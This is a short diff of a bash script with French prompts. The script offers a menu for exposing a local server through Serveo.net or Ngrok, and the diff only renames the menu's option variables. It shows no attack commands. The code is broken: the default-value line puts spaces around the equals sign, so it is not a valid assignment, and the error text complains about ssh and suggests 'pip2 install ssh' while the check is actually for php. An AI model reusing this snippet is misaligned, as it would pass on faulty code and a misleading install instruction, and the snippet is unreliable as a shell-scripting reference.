@@ -130,13 +130,13 @@ fi
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-Serveur_par_default="1"
-read -p $'\n\e[1;91m[\e[0m\e[1;73m+\e[0m\e[1;91m]\e[1;97m Choisissez une option de redirection de port \e[1;91m: \e[1;97m \e[0m' option_serveur
-option_serveur = "${option_serveur:-${Serveur_par_default}}"
-if [[ $option_serveur -eq 1 ]]; then
+default_option_server="1"
+read -p $'\n\e[1;91m[\e[0m\e[1;73m+\e[0m\e[1;91m]\e[1;97m Choisissez une option de redirection de port \e[1;91m: \e[1;97m \e[0m' option_server
+option_server = "${option_server:-${default_option_server}}"
+if [[ $option_server -eq 1 ]]; then
 command -v php > /dev/null 2>&1 || { echo >&2 "J'ai besoin de ssh mais il n'est pas installé.\nInstallez-le  pip2 install ssh et relancez."; exit 1; }
 debut
-elif [[ $option_serveur -eq 2 ]]; then
+elif [[ $option_server -eq 2 ]]; then
 ngrok_serveur
 else
 printf "\e[1;93m [!] Option invalide!\e[0m\n"
